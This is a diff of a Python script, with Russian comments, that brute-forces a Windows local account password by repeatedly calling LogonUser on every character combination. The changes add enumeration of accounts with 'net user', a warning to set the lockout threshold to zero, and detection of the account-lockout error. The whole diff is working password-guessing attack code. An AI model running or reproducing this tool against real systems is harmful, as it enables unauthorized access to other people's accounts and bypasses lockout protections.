@@ -1,15 +1,35 @@
 import ctypes
 import win32security
+import subprocess
 import win32api
 import itertools
 import string
 import time
 import json
 import os
+import sys
 
 import logo
 
-time_start = int(time.time())
+print("Убедитесь в том что у вас 'Пороговое значение блокировки: 0', иначе у вас заблокируют учетную запись!")
+
+
+user_list = []
+def list_users():
+    try:
+        # Выполняем команду net user
+        result = subprocess.run(['net', 'user'], capture_output=True, text=True, check=True, encoding="866")
+        # Выводим результат
+        print(result.stdout)
+        res = result.stdout.strip().split("\n")
+        for re in res:
+            accounts = re.split()
+            user_list.extend(accounts)
+
+    except subprocess.CalledProcessError as e:
+        print(f"Ошибка при выполнении команды: {e}")
+
+list_users()
 
 LOGON32_LOGON_INTERACTIVE = 2
 LOGON32_PROVIDER_DEFAULT = 0
@@ -76,8 +96,15 @@ else:
     i = 1
     try_id = 0
     tryed = []
-# Указываем имя пользователя и пароль
-    account = str(input("Введите имя учетной записи: "))
+    # Указываем имя пользователя и пароль
+    while True:
+        account = str(input("Введите имя учетной записи: "))
+        if account in user_list:
+            print("Учетная запись найдена")
+            break
+        else:
+            print("Учетная запись не найдена!\n Введите имя учетной записи еще раз")
+
 
     level = 0
     req_types = ["Вы хотите использовать числа для подбора: ( Y/n ) ",
@@ -114,16 +141,8 @@ else:
 
 username = account  # Замените на ваше имя пользователя
 
-
-
-
-
-
-# print("asdf " + characters)
-
-
 found = False
-
+time_start = int(time.time())
 try:
     while not found:
         for password in itertools.product(characters, repeat=i):
@@ -142,12 +161,15 @@ try:
                 )
 
                 if result:
-                    print(f"Попытка № {try_id} увенчалась успехом, йоу! Вход выполнен успешно для пароля: {password}")
+                    print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
                     found = True
                     break
                 else:
                     print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
                     tryed.append(password)
+                    if win32api.GetLastError() == 1909:
+                        print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
+                        sys.exit()
 
                 # Сохраняем прогресс после каждой попытки
                 save_progress(i, try_id, tryed)
